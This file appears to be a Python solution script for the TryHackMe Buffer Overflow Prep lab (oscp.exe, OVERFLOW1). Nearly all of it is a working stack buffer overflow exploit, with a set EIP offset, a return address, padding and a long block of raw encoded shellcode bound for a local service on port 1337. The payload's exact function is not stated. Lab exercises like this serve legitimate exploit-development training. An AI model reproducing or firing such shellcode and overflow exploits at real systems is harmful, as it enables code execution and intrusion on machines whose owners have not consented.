"""
Working solution for TryHackMe Buffer Overflow Prep, oscp.exe - OVERFLOW1
"""


import buff


target = ("127.0.0.1", 1337)
runner = buff.Buff(target = target, prefix = "OVERFLOW1 ")


# ----- 0. Configuration -----
# Set Buffer Size
runner.setBufferSize(2400)

# Set Eip offset
runner.setEipOffset(1978)


# ----- 1. FUZZING -----
# runner.fuzz()


# ----- 2. Send Bad Characters -----
# runner.sendBadChars()


# ----- 3. Reapl Exploit ------
eip_address = "\xaf\x11\x50\x62"
runner.setEipAddress(eip_address)

exploit = (
    "\xdb\xde\xd9\x74\x24\xf4\x5e\xb8\x4e\xd4\x38\xef\x33\xc9\xb1"
    "\x52\x31\x46\x17\x03\x46\x17\x83\x88\xd0\xda\x1a\xe8\x31\x98"
    "\xe5\x10\xc2\xfd\x6c\xf5\xf3\x3d\x0a\x7e\xa3\x8d\x58\xd2\x48"
    "\x65\x0c\xc6\xdb\x0b\x99\xe9\x6c\xa1\xff\xc4\x6d\x9a\x3c\x47"
    "\xee\xe1\x10\xa7\xcf\x29\x65\xa6\x08\x57\x84\xfa\xc1\x13\x3b"
    "\xea\x66\x69\x80\x81\x35\x7f\x80\x76\x8d\x7e\xa1\x29\x85\xd8"
    "\x61\xc8\x4a\x51\x28\xd2\x8f\x5c\xe2\x69\x7b\x2a\xf5\xbb\xb5"
    "\xd3\x5a\x82\x79\x26\xa2\xc3\xbe\xd9\xd1\x3d\xbd\x64\xe2\xfa"
    "\xbf\xb2\x67\x18\x67\x30\xdf\xc4\x99\x95\x86\x8f\x96\x52\xcc"
    "\xd7\xba\x65\x01\x6c\xc6\xee\xa4\xa2\x4e\xb4\x82\x66\x0a\x6e"
    "\xaa\x3f\xf6\xc1\xd3\x5f\x59\xbd\x71\x14\x74\xaa\x0b\x77\x11"
    "\x1f\x26\x87\xe1\x37\x31\xf4\xd3\x98\xe9\x92\x5f\x50\x34\x65"
    "\x9f\x4b\x80\xf9\x5e\x74\xf1\xd0\xa4\x20\xa1\x4a\x0c\x49\x2a"
    "\x8a\xb1\x9c\xfd\xda\x1d\x4f\xbe\x8a\xdd\x3f\x56\xc0\xd1\x60"
    "\x46\xeb\x3b\x09\xed\x16\xac\x3c\xfb\x1a\xff\x29\xf9\x1a\xfe"
    "\x12\x74\xfc\x6a\x75\xd1\x57\x03\xec\x78\x23\xb2\xf1\x56\x4e"
    "\xf4\x7a\x55\xaf\xbb\x8a\x10\xa3\x2c\x7b\x6f\x99\xfb\x84\x45"
    "\xb5\x60\x16\x02\x45\xee\x0b\x9d\x12\xa7\xfa\xd4\xf6\x55\xa4"
    "\x4e\xe4\xa7\x30\xa8\xac\x73\x81\x37\x2d\xf1\xbd\x13\x3d\xcf"
    "\x3e\x18\x69\x9f\x68\xf6\xc7\x59\xc3\xb8\xb1\x33\xb8\x12\x55"
    "\xc5\xf2\xa4\x23\xca\xde\x52\xcb\x7b\xb7\x22\xf4\xb4\x5f\xa3"
    "\x8d\xa8\xff\x4c\x44\x69\x1f\xaf\x4c\x84\x88\x76\x05\x25\xd5"
    "\x88\xf0\x6a\xe0\x0a\xf0\x12\x17\x12\x71\x16\x53\x94\x6a\x6a"
    "\xcc\x71\x8c\xd9\xed\x53"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
